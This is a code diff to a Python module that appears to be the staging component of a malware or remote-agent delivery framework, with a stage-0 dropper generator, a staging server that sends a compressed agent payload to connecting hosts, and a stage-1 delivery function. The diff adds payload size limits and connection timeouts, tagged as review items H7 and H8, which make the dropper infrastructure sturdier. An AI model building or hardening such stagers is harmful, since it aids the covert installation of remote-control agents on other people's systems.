@@ -41,8 +41,19 @@ import socket
 import ssl
 import textwrap
 import threading
-from typing import Optional
+from typing import Optional  # noqa: F401
 
+
+# ---------------------------------------------------------------------------
+# Constants
+# ---------------------------------------------------------------------------
+
+# H7: maximum compressed agent payload the staging server will transmit.
+# Prevents memory exhaustion if agent.py is accidentally bundled with large deps.
+_MAX_STAGE_BYTES = 10 * 1024 * 1024   # 10 MB compressed
+
+# H8: per-connection timeout for the staging handshake + payload receive.
+_STAGE_CONN_TIMEOUT = 30   # seconds
 
 # ---------------------------------------------------------------------------
 # Stage-0 dropper generator
@@ -256,8 +267,14 @@ class StagingServer:
             if magic != self.STAGE_MAGIC:
                 return
 
+            conn.settimeout(_STAGE_CONN_TIMEOUT)   # H8: guard against slowloris
+
             # Load + compress agent source
             payload = _load_agent_source(self.agent_source_path)
+
+            # H7: reject oversized payloads before transmitting
+            if len(payload) > _MAX_STAGE_BYTES:
+                return  # drop the connection silently
 
             # Send 4-byte length + payload
             import struct
@@ -297,6 +314,11 @@ def deliver_stage1(session_conn: socket.socket, agent_source_path: str = "agent.
     import struct
     try:
         payload = _load_agent_source(agent_source_path)
+        if len(payload) > _MAX_STAGE_BYTES:   # H7: size guard
+            raise ValueError(
+                f"Stage-1 payload too large: {len(payload)} bytes "
+                f"(limit {_MAX_STAGE_BYTES}). Check agent.py for bundled dependencies."
+            )
         session_conn.sendall(struct.pack("!I", len(payload)) + payload)
         return True
     except Exception:
